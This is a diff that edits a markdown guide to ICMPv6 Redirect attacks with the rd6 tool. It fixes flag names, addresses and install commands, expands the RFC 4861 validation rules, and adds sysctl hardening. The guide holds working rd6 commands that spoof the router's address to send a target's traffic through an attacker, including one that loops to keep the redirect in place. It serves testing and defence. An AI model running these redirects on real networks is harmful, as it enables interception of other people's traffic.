@@ -23,22 +23,25 @@ A Redirect tells Host A: "For destination X, use next-hop Y instead of me." If Y
 
 ```bash
 sudo apt-get install ipv6toolkit   # Debian/Ubuntu
-sudo pacman -S ipv6toolkit          # Arch Linux
+yay -S ipv6toolkit                  # Arch Linux (AUR)
 ```
 
 ## Basic rd6 Usage
 
 ```bash
 # Send a basic ICMPv6 Redirect message
+sudo rd6 -i eth0 --learn-router \
+  -d 2001:db8::10 \
+  --redir-dest 2001:db8::20 \
+  --redir-target fe80::bad
 
-sudo rd6 -i eth0
-
-# Redirect traffic from target to attacker
+# Redirect traffic from target to attacker.
+# The source must appear to be the current router for the redirected destination.
 sudo rd6 -i eth0 \
-  -s fe80::router \        # Must appear to come from the current router
-  -d 2001:db8::target \    # Host to redirect
-  --redir-dest 2001:db8::server \   # The destination being redirected
-  --redir-addr 2001:db8::attacker   # The new next-hop (attacker)
+  -s fe80::1 \
+  -d 2001:db8::10 \
+  --redir-dest 2001:db8::20 \
+  --redir-target fe80::bad
 ```
 
 ## Key rd6 Parameters
@@ -47,28 +50,27 @@ sudo rd6 -i eth0 \
 # -s: Source address (should be the legitimate router's link-local)
 # -d: Destination (the host to redirect)
 # --redir-dest: The destination address being redirected
-# --redir-addr: The new next-hop address (where to send traffic)
+# --redir-target: The new next-hop address (where to send traffic)
 
-# Example: Redirect Host A's traffic to example.com through attacker
+# Example: Redirect Host A's traffic to a server through attacker
 sudo rd6 -i eth0 \
-  -s fe80::1 \                      # Spoof router's link-local
-  -d fe80::host-a \                  # Target host
-  --redir-dest 2001:db8::server \   # Destination to redirect
-  --redir-addr fe80::attacker        # New next-hop
+  -s fe80::1 \
+  -d fe80::2 \
+  --redir-dest 2001:db8::20 \
+  --redir-target fe80::bad
 ```
 
 ## Redirect with Redirected Header Option
 
-ICMPv6 Redirects can include part of the original packet (Redirected Header option), which makes them appear more legitimate:
+ICMPv6 Redirects can include part of the original packet (Redirected Header option), which makes them appear more legitimate. `rd6` includes this option by default unless `--no-payload` is used:
 
 ```bash
-# Include redirected header (increases perceived legitimacy)
+# Include the default Redirected Header option
 sudo rd6 -i eth0 \
-  -s fe80::router \
-  -d fe80::target \
-  --redir-dest 2001:db8::server \
-  --redir-addr fe80::attacker \
-  --redir-hdr
+  -s fe80::1 \
+  -d fe80::2 \
+  --redir-dest 2001:db8::20 \
+  --redir-target fe80::bad
 ```
 
 ## Continuous Redirect Attack
@@ -78,10 +80,10 @@ Redirect entries in the routing table may timeout; continuous sending maintains 
 ```bash
 # Send Redirect every 30 seconds
 sudo rd6 -i eth0 \
-  -s fe80::router \
-  -d fe80::target \
-  --redir-dest 2001:db8::server \
-  --redir-addr fe80::attacker \
+  -s fe80::1 \
+  -d fe80::2 \
+  --redir-dest 2001:db8::20 \
+  --redir-target fe80::bad \
   --loop --sleep 30
 ```
 
@@ -93,8 +95,9 @@ On the target host, check the routing table:
 # Check if redirect was accepted
 ip -6 route show cache
 
-# Look for routes with "cache" and "redirect" flags
+# Look for routes with "cache" and "proto redirect"
 # Redirects appear as host routes in the route cache
+ip -6 route show table cache proto redirect
 
 # Remove redirect from cache (revert)
 ip -6 route flush cache
@@ -104,17 +107,19 @@ ip -6 route flush cache
 
 RFC 4861 specifies validation rules for Redirect acceptance:
 
-1. Source address must be the current first-hop router for the destination
-2. Destination must be a neighbor (on-link)
-3. Redirect must not be from an off-link source
+1. Source address must be link-local and must match the current first-hop router for the redirected destination
+2. IPv6 Hop Limit must be 255, the ICMPv6 Code must be 0, and the checksum and length must be valid
+3. ICMP Destination must not be multicast
+4. ICMP Target must be link-local when redirecting to a router, or equal to ICMP Destination when marking the destination on-link
+5. Included options must have non-zero lengths
 
 ```bash
 # Test if your host incorrectly accepts redirects from non-routers
 sudo rd6 -i eth0 \
-  -s 2001:db8::non-router \   # Not a router source
-  -d 2001:db8::target \
-  --redir-dest 2001:db8::server \
-  --redir-addr 2001:db8::attacker
+  -s 2001:db8::99 \
+  -d 2001:db8::10 \
+  --redir-dest 2001:db8::20 \
+  --redir-target fe80::bad
 # A properly configured host should ignore this
 ```
 
@@ -125,9 +130,10 @@ sudo rd6 -i eth0 \
 sudo sysctl -w net.ipv6.conf.eth0.accept_redirects=0
 
 # Make persistent
-echo "net.ipv6.conf.all.accept_redirects = 0" >> /etc/sysctl.conf
-echo "net.ipv6.conf.default.accept_redirects = 0" >> /etc/sysctl.conf
-sudo sysctl -p
+printf '%s\n' \
+  'net.ipv6.conf.all.accept_redirects = 0' \
+  'net.ipv6.conf.default.accept_redirects = 0' | sudo tee /etc/sysctl.d/99-ipv6-redirects.conf
+sudo sysctl --system
 ```
 
 | Defense | Effect |
